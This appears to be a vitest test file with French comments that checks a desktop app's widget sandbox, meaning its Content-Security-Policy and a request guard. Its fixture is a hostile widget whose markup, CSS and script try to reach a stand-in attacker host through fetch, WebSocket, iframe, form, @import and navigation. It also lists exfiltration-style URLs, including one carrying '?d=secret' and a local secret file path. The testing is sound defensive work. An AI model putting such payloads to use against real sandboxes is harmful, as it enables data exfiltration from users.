import { describe, expect, it } from 'vitest'
import { buildWidgetDocument, WIDGET_CSP } from '../../../src/main/application/widgets/WidgetDocument'
import { leavesWidgetSandbox } from '../../../src/main/application/widgets/widgetUrl'

const WIDGET = 'gi-widget://widget/00000000-0000-4000-8000-0000000000c2/00000000-0000-4000-8000-0000000000d1'
const light = { scheme: 'light' as const, colors: {} }

/** Document d'un widget hostile : chaque partie tente de sortir du bac à sable. */
const hostile = buildWidgetDocument(
  {
    title: 'Hostile',
    html: '<img src="https://evil.example/pixel.png"><iframe src="https://evil.example"></iframe><form action="https://evil.example"></form>',
    css: '@import url(https://evil.example/a.css); body { background: url(https://evil.example/b.png); }',
    js: 'fetch("https://evil.example"); new WebSocket("wss://evil.example"); parent.postMessage(1, "*"); window.open("https://evil.example"); alert(1); location.href = "https://evil.example"; window.api'
  },
  light
)

describe('tentatives d’évasion d’un widget (spec 004 SC-002)', () => {
  it.each([
    ['fetch / XMLHttpRequest / WebSocket / EventSource', 'connect-src'],
    ['cadre imbriqué', 'frame-src'],
    ['worker', 'worker-src'],
    ['objet ou greffon', 'object-src'],
    ['manifeste', 'manifest-src']
  ])('should_block_%s_because_the_policy_never_opens_it', (_vector, directive) => {
    // `default-src 'none'` couvre toute directive de chargement absente.
    expect(WIDGET_CSP).toContain("default-src 'none'")
    expect(WIDGET_CSP).not.toContain(directive)
  })

  it('should_allow_no_remote_source_in_any_directive', () => {
    expect(WIDGET_CSP).not.toMatch(/https?:|wss?:|\*|'self'|'unsafe-eval'/)
  })

  it('should_block_form_submission_and_base_hijacking', () => {
    expect(WIDGET_CSP).toContain("form-action 'none'")
    expect(WIDGET_CSP).toContain("base-uri 'none'")
  })

  it('should_apply_the_policy_before_the_hostile_markup_is_parsed', () => {
    const policy = hostile.indexOf('http-equiv="Content-Security-Policy"')
    expect(policy).toBeGreaterThan(-1)
    for (const attempt of ['<img src="https://evil', '@import url(https://evil', 'fetch("https://evil']) {
      expect(hostile.indexOf(attempt)).toBeGreaterThan(policy)
    }
  })

  it('should_disable_webrtc_before_the_hostile_script_runs', () => {
    expect(hostile.indexOf("'RTCPeerConnection'")).toBeLessThan(hostile.indexOf('fetch("https://evil'))
    expect(hostile).toContain('configurable: false')
  })

  it.each([
    'https://evil.example/collect?d=secret',
    'http://127.0.0.1:11434/api/generate',
    'wss://evil.example',
    'file:///C:/Users/x/secret.txt',
    'ftp://evil.example'
  ])('should_cancel_a_request_from_a_widget_to_%s', (url) => {
    expect(leavesWidgetSandbox(WIDGET, url)).toBe(true)
  })

  it('should_let_a_widget_document_load_and_leave_the_app_requests_alone', () => {
    expect(leavesWidgetSandbox(WIDGET, WIDGET)).toBe(false)
    expect(leavesWidgetSandbox('file:///app/index.html', WIDGET)).toBe(false)
    expect(leavesWidgetSandbox('http://localhost:5173/', 'http://localhost:5173/src/main.tsx')).toBe(false)
    expect(leavesWidgetSandbox('', 'https://api.anthropic.com')).toBe(false)
  })
})
